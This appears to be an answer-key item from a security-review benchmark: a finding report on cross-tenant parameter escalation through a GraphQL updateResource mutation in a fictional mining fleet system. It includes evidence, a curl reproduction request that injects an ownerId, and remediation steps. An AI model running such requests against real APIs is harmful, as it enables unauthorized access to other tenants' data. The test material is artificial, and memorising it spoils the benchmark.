# Expected Response

## System
- Domain: Mining / Resource Extraction
- System: OreTrack Fleet Management
- Example ID: GQL-0175

## Priority Findings

### Finding 1: Mining Fleet — Parameter Escalation via updateResource Exposes Cross-Tenant Fleet Data (Pattern 10.2)
**Severity:** High
**Category:** Single-User / Parameter Escalation / Own Session Scope Extension

**Summary:**
Per §5.0 (Pattern 10.2 — parameter escalation): The `updateResource` resolver allows escalation beyond the caller's own session scope by accepting any `resourceId` with a client-supplied `ownerId`. An attacker from `tenant-ff68` submitted `updateResource(id: "R-2175", input: {status: "approved", ownerId: "attacker-ff68b089"})` against a fleet resource belonging to `tenant-b089`, gaining cross-tenant access including `CONFIDENTIAL-ff68b089`. In Mining / Resource Extraction, this enables unauthorized modification of fleet telemetry and equipment safety status.

**Evidence from HAR:**
- Request: `POST https://api.oretrack-fleet-manag.example.com/graphql` (2026-04-13)
- JWT `x-tenant-id`: `tenant-ff68`
- Mutation: `updateResource(id: "R-2175", input: {status: "approved", ownerId: "attacker-ff68b089"}) { resourceId status }`
- Response `200 OK`: `tenantId: "tenant-b089"`, `ownerId: "other-user-ff68b089"`, `sensitiveField: "CONFIDENTIAL-ff68b089"`, `internalNotes: "Internal data exposed"`
- `x-request-id: req-ff68b089`

**Evidence Map:**

| Artifact | Location | Finding |
|---|---|---|
| context.txt §5.0 | Pattern 10.2 | Parameter escalation, own scope extension |
| HAR request | input.ownerId | attacker-ff68b089 (client-injected) |
| HAR response | tenantId | Cross-tenant fleet data tenant-b089 |
| HAR response | sensitiveField | CONFIDENTIAL-ff68b089 |

## Steps to Reproduce

### Step 1 — updateResource parameter escalation (HAR)
```bash
curl -s -X POST https://api.oretrack-fleet-manag.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" -H "x-tenant-id: tenant-ff68" \
  -d '{"query": "mutation { updateResource(id: \"R-2175\", input: {status: \"approved\", ownerId: \"attacker-ff68b089\"}) { resourceId status } }"}'
```
**Vulnerable:** `tenant-b089` fleet resource mutated. **Secure:** FORBIDDEN.

## Remediation
1. Resolver: `WHERE resource_id=$id AND tenant_id=$jwt.tenantId`.
2. Strip `ownerId` from `ResourceInput`.
3. Redis cache key: `resource:{tenantId}:{resourceId}`.
